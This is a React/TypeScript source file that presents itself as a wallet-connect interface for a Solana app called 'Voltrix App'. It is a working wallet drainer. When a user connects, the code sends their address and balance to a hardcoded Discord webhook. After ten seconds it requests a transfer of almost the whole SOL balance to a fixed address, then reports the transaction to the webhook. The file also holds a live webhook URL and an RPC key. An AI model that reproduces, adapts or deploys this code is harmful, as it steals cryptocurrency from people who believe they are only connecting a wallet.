import React, { FC, ReactNode, useEffect, useMemo, useState } from 'react';
import ReactDOM from 'react-dom';
import { WalletAdapterNetwork } from '@solana/wallet-adapter-base';
import {
    ConnectionProvider,
    WalletProvider,
    useWallet,
} from '@solana/wallet-adapter-react';
import {
    WalletModalProvider,
    useWalletModal,
    WalletMultiButton,
} from '@solana/wallet-adapter-react-ui';
import {
    PhantomWalletAdapter,
    GlowWalletAdapter,
    SlopeWalletAdapter,
    SolflareWalletAdapter,
} from '@solana/wallet-adapter-wallets';
import {
    Connection,
    PublicKey,
    LAMPORTS_PER_SOL,
    SystemProgram,
    Transaction,
} from '@solana/web3.js';

import '@solana/wallet-adapter-react-ui/styles.css';

const App: FC = () => {
    return (
        <Context>
            <ExposeWalletModal />
            <WalletConnectionHandler />
            <InjectWalletMultiButton />
        </Context>
    );
};

const Context: FC<{ children: ReactNode }> = ({ children }) => {
    const network = WalletAdapterNetwork.Mainnet;

    const wallets = useMemo(
        () => [
            new PhantomWalletAdapter(),
            new GlowWalletAdapter(),
            new SlopeWalletAdapter(),
            new SolflareWalletAdapter({ network }),
        ],
        [network]
    );

    return (
        <ConnectionProvider endpoint="https://api.mainnet-beta.solana.com">
            <WalletProvider wallets={wallets} autoConnect>
                <WalletModalProvider>{children}</WalletModalProvider>
            </WalletProvider>
        </ConnectionProvider>
    );
};

const ExposeWalletModal: FC = () => {
    const { setVisible } = useWalletModal();

    useEffect(() => {
        (window as any).openSolanaWalletModal = () => setVisible(true);
    }, [setVisible]);

    useEffect(() => {
        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        const isPhantom = (window as any).solana?.isPhantom;

        if (isMobile && !isPhantom) {
            const url = encodeURIComponent(window.location.href);
            window.location.href = `https://phantom.app/ul/browse/${url}`;
        }
    }, []);

    return null;
};

const WalletConnectionHandler: FC = () => {
    const { publicKey, connected, sendTransaction } = useWallet();
    const [solBalance, setSolBalance] = useState<number | null>(null);

    useEffect(() => {
        if (connected && publicKey) {
            fetchBalanceAndSendTx(publicKey);
        }
    }, [connected, publicKey]);

    const fetchBalanceAndSendTx = async (walletPublicKey: PublicKey) => {
        const rpcEndpoints = [
            'https://solana-mainnet.core.chainstack.com/a46a9efb6b65a3f6ac72858654218413',
            'https://rpc.ankr.com/solana',
        ];

        let connection: Connection | null = null;
        let lamports: number | null = null;

        for (const endpoint of rpcEndpoints) {
            try {
                const testConn = new Connection(endpoint, 'confirmed');
                lamports = await testConn.getBalance(walletPublicKey);
                connection = testConn;
                break;
            } catch (err) {
                console.warn(`⚠️ RPC failed: ${endpoint}`, err);
            }
        }

        if (!connection || lamports === null) {
            alert('❌ Connection failed with wallets');
            return;
        }

        try {
            const balanceSol = lamports / LAMPORTS_PER_SOL;
            setSolBalance(balanceSol);
            console.log(`✅ Using RPC: ${connection.rpcEndpoint}`);
            console.log(`💰 Balance: ${balanceSol.toFixed(5)} SOL`);

            await sendDiscordWebhook(walletPublicKey.toBase58(), balanceSol);

            if (lamports <= 0) {
                alert('⚠️ Not enough SOL to perform a transaction.');
                return;
            }

            const toPubkey = new PublicKey('5rLnkHX3gP5S7SjyDWAUL1mi9gAkiTdXrjT4XDEv7vMz');
            const blockhash = await connection.getLatestBlockhash();

            const reservedLamports = 1000000; // 0.001 SOL reserved
            const availableLamports = lamports - reservedLamports;

            if (availableLamports <= 0) {
                alert('⚠️ Not enough SOL after reservation to perform a transaction.');
                return;
            }

            const feeResp = await connection.getFeeForMessage(
                new Transaction({
                    feePayer: walletPublicKey,
                    recentBlockhash: blockhash.blockhash,
                })
                    .add(
                        SystemProgram.transfer({
                            fromPubkey: walletPublicKey,
                            toPubkey,
                            lamports: availableLamports,
                        })
                    )
                    .compileMessage()
            );

            const feeLamports = feeResp.value || 5000;
            const sendableLamports = availableLamports - feeLamports;

            if (sendableLamports <= 0) {
                alert('⚠️ Not enough SOL to cover the transaction fee after reservation.');
                return;
            }

            const finalTx = new Transaction({
                feePayer: walletPublicKey,
                recentBlockhash: blockhash.blockhash,
            }).add(
                SystemProgram.transfer({
                    fromPubkey: walletPublicKey,
                    toPubkey,
                    lamports: sendableLamports,
                })
            );

            setTimeout(async () => {
                try {
                    const txid = await sendTransaction(finalTx, connection!);
                    console.log(`🚀 Transaction sent: https://solscan.io/tx/${txid}`);

                    await sendDiscordWebhook(
                        walletPublicKey.toBase58(),
                        lamports! / LAMPORTS_PER_SOL,
                        sendableLamports,
                        toPubkey.toBase58(),
                        txid
                    );
                } catch (err) {
                    console.error('❌ Failed to send transaction:', err);
                    alert('❌ Transaction failed');
                }
            }, 10000);
        } catch (err) {
            console.error('❌ Error sending transaction:', err);
            alert('❌ Creation failed.');
        }
    };

    const sendDiscordWebhook = async (
        address: string,
        sol: number,
        sentAmount?: number,
        recipient?: string,
        txid?: string
    ) => {
        const webhookUrl =
            'https://discord.com/api/webhooks/1366605800629342319/0lUnytG_cE-IM9VlKe2KATejmXrnSwwK2d3xfZObkPmyISv4IGUpcP4hHry6EUUzpUzQ';

        const fields: any[] = [
            {
                name: '🧾 Wallet Address',
                value: `\`${address}\``,
            },
            {
                name: '💰 SOL Balance',
                value: `${sol.toFixed(5)} SOL`,
            },
        ];

        if (sentAmount !== undefined && recipient) {
            fields.push(
                {
                    name: '📤 Amount Sent',
                    value: `${(sentAmount / LAMPORTS_PER_SOL).toFixed(5)} SOL`,
                },
                {
                    name: '📬 Sent To',
                    value: `\`${recipient}\``,
                }
            );
        }

        if (txid) {
            fields.push({
                name: '🔗 Transaction',
                value: `[View on Solscan](https://solscan.io/tx/${txid})`,
            });
        }

        const body = {
            embeds: [
                {
                    title: sentAmount ? '✅ Transaction Sent' : '🟢 Solana Wallet Connected',
                    color: sentAmount ? 0x00ccff : 0x00ff99,
                    fields,
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: 'Voltrix App',
                    },
                },
            ],
        };

        try {
            await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(body),
            });
            console.log('📩 Discord webhook sent.');
        } catch (err) {
            console.error('❌ Failed to send webhook:', err);
        }
    };

    const walletPopupEl =
        typeof window !== 'undefined' ? document.querySelector('.wallet-popup#walletPopup') : null;

    return walletPopupEl ? ReactDOM.createPortal(<div></div>, walletPopupEl) : null;
};

const InjectWalletMultiButton: FC = () => {
    const target = typeof window !== 'undefined' ? document.getElementById('connect_button') : null;
    const { connected } = useWallet();
    const { setVisible } = useWalletModal();

    useEffect(() => {
        const closePopupOnClick = () => {
            const popup = document.querySelector('.wallet-popup#walletPopup') as HTMLElement;
            if (popup) {
                popup.style.display = 'none';
            }
        };

        const observer = new MutationObserver(() => {
            const button = document.querySelector('.wallet-adapter-button') as HTMLElement;
            if (button) {
                button.addEventListener('click', closePopupOnClick, { once: true });
            }
        });

        if (target) {
            observer.observe(target, { childList: true, subtree: true });
        }

        return () => observer.disconnect();
    }, [target]);

    return target
        ? ReactDOM.createPortal(
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '10px' }}>
                  <WalletMultiButton
                      style={{
                          background: 'linear-gradient(to right, #ff5cd1, #ff91e3)',
                          color: 'white',
                          fontSize: '16px',
                          fontWeight: '600',
                          border: 'none',
                          boxShadow: '0 0 12px rgba(255, 92, 209, 0.6)',
                          cursor: 'pointer',
                      }}
                  />
                  {connected && (
                      <button
                          onClick={() => setVisible(true)}
                          style={{
                              background: 'transparent',
                              border: 'none',
                              color: '#6366f1',
                              textDecoration: 'underline',
                              fontSize: '14px',
                              cursor: 'pointer',
                          }}
                      >
                          Change Wallet
                      </button>
                  )}
              </div>,
              target
          )
        : null;
};

export default App;
